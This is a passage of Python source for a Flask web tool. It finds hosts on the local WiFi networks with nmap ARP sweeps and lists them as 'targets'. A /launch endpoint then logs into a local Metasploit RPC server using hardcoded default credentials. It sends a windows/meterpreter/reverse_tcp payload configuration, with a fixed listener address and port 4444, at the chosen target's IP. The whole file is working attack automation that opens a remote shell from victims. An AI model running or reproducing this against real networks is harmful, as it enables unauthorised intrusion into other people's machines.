targets = []
MAC_RE = re.compile(r"(([0-9a-f]{2}[:\-]){5}[0-9a-f]{2})", re.IGNORECASE)

def get_local_ipv4s():
    out = subprocess.check_output(["ip", "-4", "addr", "show"]).decode()
    return set(re.findall(r'inet\s+(\d+\.\d+\.\d+\.\d+)', out))

def get_iface_networks(selected_ifaces=None):
    """
    Returns a list of (iface_name, network_cidr) for interfaces we want to scan.
    """
    result = []
    out = subprocess.check_output(["ip", "-4", "addr", "show"]).decode()
    lines = out.split("\n")
    current_iface = None
    for line in lines:
        # e.g. "3: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> ..."
        if re.match(r"^\d+:\s+\w+", line):
            parts = line.split(":")
            if len(parts) >= 2:
                current_iface = parts[1].strip()
        # e.g. "    inet 10.0.0.62/24 brd 10.0.0.255 scope global dynamic noprefixroute wlan0"
        if "inet " in line and current_iface:
            match = re.search(r'inet\s+([\d\.]+)/(\d+)', line)
            if match:
                ip_str = match.group(1)
                prefix = int(match.group(2))
                # skip loopback
                if ip_str.startswith("127."):
                    continue
                # If we have a filter on ifaces, apply it
                if selected_ifaces and current_iface not in selected_ifaces:
                    continue
                # Build network CIDR
                network = ipaddress.IPv4Network(f"{ip_str}/{prefix}", strict=False)
                result.append((current_iface, str(network)))
    return result

def run_nmap_arp(iface, network):
    """
    Run nmap ARP/ping sweep on a given interface and network.
    Returns list of discovered hosts: [{"ip": ..., "mac": ..., "hostname": ..., "vendor": ...}, ...]
    """
    log.info(f"Running nmap ARP/ping sweep on {iface} ({network}) with args: -sn -PR -e {iface}")
    nm = nmap.PortScanner()
    try:
        nm.scan(hosts=network, arguments=f"-sn -PR -e {iface}")
    except Exception as e:
        log.error(f"nmap scan failed on {iface}/{network}: {e}")
        return []
    hosts_data = []
    for host in nm.all_hosts():
        mac = nm[host].get("addresses", {}).get("mac", "")
        hostname = nm[host].hostname() or ""
        vendor = nm[host].get("vendor", {}).get(mac, "") if mac else ""
        hosts_data.append({
            "ip": host,
            "mac": mac,
            "hostname": hostname,
            "vendor": vendor
        })
    return hosts_data

@app.route("/list_targets")
def list_targets():
    global targets
    targets = []
    # Determine which interfaces to scan (you can make this configurable)
    selected_ifaces = ["wlan0", "wlan1"]  # Example: your WiFi interfaces
    iface_nets = get_iface_networks(selected_ifaces)
    log.info(f"Will scan networks (iface -> network): {iface_nets}")
    all_hosts = []
    for (iface, network) in iface_nets:
        discovered = run_nmap_arp(iface, network)
        all_hosts.extend(discovered)
    # Get local IPs so we can filter them out
    local_ips = get_local_ipv4s()
    log.info(f"Local IPs: {local_ips}")
    # Filter out hosts with no MAC or local IPs
    for host in all_hosts:
        if not host["mac"]:
            continue
        if host["ip"] in local_ips:
            log.info(f"Skipping local IP {host['ip']}")
            continue
        targets.append(host)
    return jsonify({"targets": targets})

@app.route("/launch", methods=["POST"])
def launch_exploit():
    data = request.get_json(force=True)
    mac_input = data.get("mac")
    if not mac_input:
        return jsonify({"error": "MAC address required"}), 400
    target = next((t for t in targets if t["mac"].lower() == mac_input.lower()), None)
    if not target:
        return jsonify({"error": "MAC address not found"}), 404
    ip = target["ip"]
    url = "http://127.0.0.1:55552/api/"
    headers = {"Content-Type": "binary/message-pack"}
    def msf_call(method, params):
        payload = msgpack.packb({"method": method, "params": params})
        response = requests.post(url, data=payload, headers=headers)
        return msgpack.unpackb(response.content, strict_map_key=False)
    try:
        auth = msf_call("auth.login", ["msf", "kali"])
        token = auth.get("token")
    except Exception as e:
        log.error("Metasploit auth failed: %s", e)
        return jsonify({"error": f"Metasploit auth failed: {str(e)}"}), 500
    exploit_params = {
        "RHOSTS": ip,
        "PAYLOAD": "windows/meterpreter/reverse_tcp",
        "LHOST": "10.0.0.216",
        "LPORT": 4444
    }
    try:
        result = msf_call("module.execute", [token, "exploit", "multi/handler", exploit_params])
        return jsonify({"result": result})
    except Exception as e:
        log.error("Exploit execution failed: %s", e)
        return jsonify({"error": f"Exploit failed: {str(e)}"}), 500

